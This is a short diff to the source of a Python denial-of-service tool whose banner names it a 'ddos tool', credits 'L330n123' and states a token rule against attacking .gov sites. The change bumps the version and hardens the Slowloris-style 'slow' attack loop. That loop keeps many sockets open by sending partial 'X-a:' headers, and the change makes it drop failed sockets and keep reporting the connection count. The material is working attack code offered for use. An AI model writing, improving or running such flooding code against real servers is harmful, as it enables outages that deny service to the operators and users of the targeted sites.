@@ -23,7 +23,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.6 (Fixed slow mode)
+Python3 version 2.6.1 (Fixed slow mode)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║        Tos: Don't attack .gov website       ║
@@ -291,7 +291,13 @@ def slow(conn,socks_type):
 			sys.stdout.flush()
 	while True:
 		for s in list(socket_list):
+			try:
 				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+				sys.stdout.flush()
+			except:
+				s.close()
+				socket_list.remove(s)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 		for _ in range(conn - len(socket_list)):
